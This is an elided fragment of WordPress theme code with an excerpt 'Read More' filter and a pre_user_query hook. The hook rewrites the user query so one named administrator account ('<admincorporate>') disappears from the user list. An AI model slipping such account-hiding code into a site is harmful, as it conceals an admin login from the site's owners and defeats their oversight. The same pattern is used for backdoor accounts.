...
function cpk_add_excerpt_more( $more ) {
    return '<span class="more-link"><a href="' . get_permalink() . '" rel="nofollow">' . __( 'Read More', 'cpk' ) . '</a></span>';
    // return '...';
}
...
//* Format of date set in dashborad General Settings | Date Format
...
function yoursite_pre_user_query($user_search) {
  ...
  if ($username == '<admincorporate>') { 
    ...
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != '<admincorporate>'",$user_search->query_where);
  }
}
